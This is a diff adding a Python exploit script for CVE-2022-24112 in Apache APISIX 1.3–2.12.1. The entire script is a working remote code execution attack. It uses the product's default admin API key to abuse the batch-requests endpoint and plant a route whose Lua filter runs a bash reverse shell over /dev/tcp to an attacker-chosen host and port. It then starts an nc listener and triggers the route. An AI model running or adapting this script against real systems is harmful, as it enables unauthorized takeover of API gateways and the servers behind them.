@@ -1,0 +1,109 @@
+#!/usr/bin/python3
+# Exploit Title: Apache APISIX 2.12.1 - Remote Code Execution (RCE)
+# Vendor Homepage: https://apisix.apache.org/
+# Version: Apache APISIX 1.3 – 2.12.1
+# Tested on: Kali Linux
+# CVE : CVE-2022-24112
+
+import requests
+import sys
+import subprocess
+import shlex
+import argparse
+
+class Interface ():
+	def __init__ (self):
+		self.red = '\033[91m'
+		self.green = '\033[92m'
+		self.white = '\033[37m'
+		self.yellow = '\033[93m'
+		self.bold = '\033[1m'
+		self.end = '\033[0m'
+
+	def header(self):
+		print('\n    >> Apache APISIX 2.12.1 - Remote Code Execution (RCE)')
+		print('    >> by twseptian\n')
+
+	def info (self, message):
+		print(f"[{self.white}*{self.end}] {message}")
+
+	def warning (self, message):
+		print(f"[{self.yellow}!{self.end}] {message}")
+
+	def error (self, message):
+		print(f"[{self.red}x{self.end}] {message}")
+
+	def success (self, message):
+		print(f"[{self.green}✓{self.end}] {self.bold}{message}{self.end}")
+
+# Instantiate our interface class
+global output
+output = Interface()
+output.header()
+
+class Exploit:
+    def __init__(self, target_ip, target_port, localhost,localport):
+        self.target_ip = target_ip
+        self.target_port = target_port
+        self.localhost = localhost
+        self.localport = localport
+    
+    def get_rce(self):
+        headers1 = {
+            'Host': '{}:8080'.format(target_ip),
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.81 Safari/537.36 Edg/97.0.1072.69',
+            'X-API-KEY': 'edd1c9f034335f136f87ad84b625c8f1',
+            'Accept': '*/*','Accept-Encoding': 'gzip, deflate',
+            'Content-Type': 'application/json',
+            'Content-Length': '540','Connection': 'close',
+        }
+        headers2 = {
+            'Host': '{}:8080'.format(target_ip),
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.81 Safari/537.36 Edg/97.0.1072.69',
+            'X-API-KEY': 'edd1c9f034335f136f87ad84b625c8f1',
+            'Accept': '*/*','Accept-Encoding': 'gzip, deflate',
+            'Content-Type': 'application/json',
+            'Connection': 'close',
+        }
+        json_data = {
+            'headers': {
+                'X-Real-IP': '{}:8080'.format(target_ip),
+                'X-API-KEY': 'edd1c9f034335f136f87ad84b625c8f1',
+                'Content-Type': 'application/json',
+            },
+            'timeout': 1500,
+            'pipeline': [
+                { 
+                    'path': '/apisix/admin/routes/index','method': 'PUT',
+                    'body': '{"uri":"/rms/fzxewh","upstream":{"type":"roundrobin","nodes":{"schmidt-schaefer.com":1}},"name":"wthtzv","filter_func":"function(vars) os.execute(\'bash -c \\\\\\"0<&160-;exec 160<>/dev/tcp/'+localhost+'/'+localport+';/bin/sh <&160 >&160 2>&160\\\\\\"\'); return true end"}',
+                },
+            ],
+        }
+        
+        output.warning("Take RCE\n")
+        response1 = requests.post('http://'+target_ip+':'+target_port+'/apisix/batch-requests', headers=headers1, json=json_data, verify=False)
+        listener = "nc -nvlp {}".format(localport)
+        cmnd = shlex.split(listener)
+        subprocess.Popen(cmnd)
+        response2 = requests.get('http://'+target_ip+':'+target_port+'/rms/fzxewh', headers=headers2, verify=False)
+
+def get_args():
+    parser = argparse.ArgumentParser(description='Apache APISIX 2.12.1 - Remote Code Execution (RCE)')
+    parser.add_argument('-t', '--rhost', dest="target_ip", required=True, action='store', help='Target IP')
+    parser.add_argument('-p', '--rport', dest="target_port", required=True, action='store', help='Target Port')
+    parser.add_argument('-L', '--lhost', dest="localhost", required=True, action='store', help='Localhost/Local IP')
+    parser.add_argument('-P', '--lport', dest="localport", required=True, action='store', help='Localport')
+    args = parser.parse_args()
+    return args
+
+try:
+    args = get_args()
+    target_ip = args.target_ip
+    target_port = args.target_port
+    localhost = args.localhost
+    localport = args.localport
+    
+    exp = Exploit(target_ip, target_port, localhost, localport)
+    exp.get_rce()
+except KeyboardInterrupt:
+    pass
